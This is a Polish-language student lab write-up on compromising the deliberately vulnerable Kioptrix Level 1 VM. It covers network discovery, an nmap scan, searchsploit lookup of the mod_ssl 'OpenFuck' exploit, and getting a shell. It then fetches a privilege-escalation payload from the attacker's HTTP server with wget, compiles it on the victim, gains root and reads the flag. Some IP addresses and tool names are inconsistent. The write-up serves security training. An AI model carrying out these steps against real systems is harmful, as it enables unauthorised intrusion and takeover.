<!-- ?xml version='1.0' encoding='UTF-8'? -->
<link href="/github-markdown-css/github-css.css" rel="stylesheet"/>
<meta charset="utf-8" content="text/html"/>
<div class="gist">
<style class="formula-style">
        svg.gh-md-to-html-formula {
            fill: black;
        }
    </style>
<div class="gist-file"> <!-- This is the class that is responsible for the boxing! -->
<div class="gist-data">
<div class="js-gist-file-update-container js-task-list-container file-box">
<div class="file" id="user-content-article-zad2-Kioptrix">
<div class="Box-body readme blob js-code-block-container p-5 p-xl-6" id="user-content-file-docker-image-pull-md-readme" style="margin-left: 40px; margin-right: 40px; margin-top: 20px; margin-bottom: 20px">
<article class="markdown-body entry-content container-lg" itemprop="text">
<div class="markdown-heading"><h1 class="heading-element">1. Zadanie 2 - Kioptrix Lvl 1</h1><a aria-label="Permalink: 1. Zadanie 2 - Kioptrix Lvl 1" class="anchor" href="#user-content-1-zadanie-2---kioptrix-lvl-1" id="user-content-1-zadanie-2---kioptrix-lvl-1" name="user-content-1-zadanie-2---kioptrix-lvl-1"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h2 class="heading-element">Cel 1 - Znaleźć Kioptrix'a</h2><a aria-label="Permalink: Cel 1 - Znaleźć Kioptrix'a" class="anchor" href="#user-content-cel-1---znaleźć-kioptrixa" id="user-content-cel-1---znaleźć-kioptrixa" name="user-content-cel-1---znaleźć-kioptrixa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Po ustawieniu obydwu maszyn, Kali linuxa oraz Kioptrix’a ustawiam obydwie sieci na wewnętrzne, tak żeby maszyny się widziały i żebym nie widział niepotrzebnej reszty urządzeń w sieci.</p>
<p>Na początku na Kali Linuxie aby sprawdzić swój adres ip w sieci (i adres sieci) wpisuję komendę: <code>ip a</code></p>
<p>Z wyniku dowiaduje się że moje ip to: <code>192.16.64.2/24</code>, co znaczy że adres mojej sieci to <code>192.16.64</code></p>
<p>przeszukuję tą sieć używając <code>netdiscovery -r 192.16.64</code> i dostaję taki wynik:</p>
<p><a href="/images/image-1.png" rel="noopener noreferrer" target="_blank"><img alt="victim" data-canonical-src="/images/image-1.png" src="/images/image-1.png" style="max-width: 100%; max-height: 454px;"/></a>
Mamy już IP ofiary</p>
<div class="markdown-heading"><h2 class="heading-element">Cel 2 - Zidentyfikować Ofiarę</h2><a aria-label="Permalink: Cel 2 - Zidentyfikować Ofiarę" class="anchor" href="#user-content-cel-2---zidentyfikować-ofiarę" id="user-content-cel-2---zidentyfikować-ofiarę" name="user-content-cel-2---zidentyfikować-ofiarę"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Dowiemy się conieco o niej korzystając z narzędzia <strong>nmap</strong> wyszukując jej czułe punkty, pozyskując jednocześnie informację o otwartych portach za pomocą: <code>nmap -v 192.168.64.1</code></p>
<p>Po jej wykonaniu otrzymujemy piękną liste otwartych portów które są otwarte niczym drzwi do chaty:
<a href="/images/image-4.png" rel="noopener noreferrer" target="_blank"><img alt="sys_vulnerabilities" data-canonical-src="/images/image-4.png" src="/images/image-4.png" style="max-width: 100%; max-height: 936px;"/></a></p>
<div class="markdown-heading"><h2 class="heading-element">Cel 3 - Znaleźć słabość</h2><a aria-label="Permalink: Cel 3 - Znaleźć słabość" class="anchor" href="#user-content-cel-3---znaleźć-słabość" id="user-content-cel-3---znaleźć-słabość" name="user-content-cel-3---znaleźć-słabość"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Mamy czułe punkty, teraz trzeba wiedzieć który wykorzystać.</p>
<p>Do tego wystarcz znaleźć w internecie kod który po wukonaniu dostanie się przez te luki w zabezpieczeniach do środka, używamy do tego narzędzia <strong>searchexploit</strong>, w którym mamy historię włamań wraz z dziurą w systemie i gotowym kodem który ktoś napisał wykorzystując konkretną lukę w oprogramowaniu.</p>
<p>Ale najpierw szybki update bazy danych więc wbijam komendę <code>searchexploit --update</code>, żeby mi przegrał wszystkie exploit'y na dysk lokalny.</p>
<div class="markdown-heading"><h2 class="heading-element">Cel 4 - Znaleźć exploit</h2><a aria-label="Permalink: Cel 4 - Znaleźć exploit" class="anchor" href="#user-content-cel-4---znaleźć-exploit" id="user-content-cel-4---znaleźć-exploit" name="user-content-cel-4---znaleźć-exploit"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Aby to uczynić musimy przeszukać bazę komendą <code>searchsploit [no to szukamy]</code>. Ja widzę że mod_ssql jest stary i tak znajduję gotowe exploity</p>
<p><a href="/images/image-5.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-5.png" src="/images/image-5.png" style="max-width: 100%; max-height: 740px;"/></a></p>
<p>Pobieram 47080.c przy użyciu <code>searchsploit -m 47080.c</code> który kopiuje się do mojego folderu domowego <strong>/mlq</strong></p>
<p>Teraz potrzebujemy skompilować skrypt w języku <strong>C</strong> aby go uruchomić.
Niestety nowy kompilator <strong>gcc</strong> w kali nie da rady skompilować przestarzałego pliku tak aby go otwrzył.
<a href="/images/image-3.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-3.png" src="/images/image-3.png" style="max-width: 100%; max-height: 750px;"/></a></p>
<p>Z tego powodu przeszukuję i pobieram nowy plik na GH ten sam tylko zakutalizowany, z tą samą nazwą za pomocą komendy:
<code>git clone github.com/expolit-inters/openfuck</code></p>
<div class="markdown-heading"><h2 class="heading-element">Cel 5 - Uzyskać root'a</h2><a aria-label="Permalink: Cel 5 - Uzyskać root'a" class="anchor" href="#user-content-cel-5---uzyskać-roota" id="user-content-cel-5---uzyskać-roota" name="user-content-cel-5---uzyskać-roota"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Uruchamiam pobrany i skompilowany exploit, celując w odpowiednią wersję systemu (RedHat) i adres IP ofiary. Atak pozwala mi uzyskać dostęp do powłoki:</p>
<p><a href="/images/image-6.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-6.png" src="/images/image-6.png" style="max-width: 100%; max-height: 1598px;"/></a></p>
<p>ale na początku jestem tylko zwykłym użytkownikiem (użytkownik apache lub nobody).</p>
<p>Aby stać się administratorem (root), exploit próbuje automatycznie pobrać i uruchomić plik: <strong>c.3</strong>. Niestety, Kioptrix jest zbyt stary, by obsłużyć nowoczesne połączenia HTTPS, więc automatyczne pobieranie zawodzi. Muszę to zrobić ręcznie wystawiając mini server.</p>
<ul>
<li>Na Kali Linux uruchamiam prosty serwer HTTP w folderze z exploitem:</li>
</ul>
<p><code>python3 -m http.server 80</code></p>
<ul>
<li>Na Kioptrixie (w uzyskanej powłoce) przechodzę do katalogu tymczasowego i pobieram plik od siebie:</li>
</ul>
<p><code>wget http://192.168.65.2/c.3</code></p>
<ul>
<li>Kompiluję go na maszynie ofiary i uruchamiam:</li>
</ul>
<p><code>gcc -o exploit c.3</code></p>
<p><a href="/images/image-7.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-7.png" src="/images/image-7.png" style="max-width: 100%; max-height: 2090px;"/></a></p>
<p>Po uruchomieniu <strong>exploit</strong> następuje eskalacja uprawnień. Znak zachęty zmienia się na #, a komenda whoami zwraca upragniony wynik: root.</p>
<p><a href="/images/image-8.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-8.png" src="/images/image-8.png" style="max-width: 100%; max-height: 904px;"/></a></p>
<p>Następnie żeby zmiany były na stałe zmieniam mu hasło <code>passswd</code> i dla potwierdzenia że zadziałało loguje się przez vm kioptrixa.</p>
<p><a href="/images/image-9.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-9.png" src="/images/image-9.png" style="max-width: 100%; max-height: 900px;"/></a></p>
<div class="markdown-heading"><h2 class="heading-element">Flaga</h2><a aria-label="Permalink: Flaga" class="anchor" href="#user-content-flaga" id="user-content-flaga" name="user-content-flaga"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Teraz sprawdzam zawartość flagi idąc do folderu <code>mail</code> i zczytując plik <code>root</code> jak w instrukcji:</p>
<p><a href="/images/image-10.png" rel="noopener noreferrer" target="_blank"><img alt="alt text" data-canonical-src="/images/image-10.png" src="/images/image-10.png" style="max-width: 100%; max-height: 816px;"/></a></p>
</article>
</div>
</div>
</div>
</div>
</div>
</div>
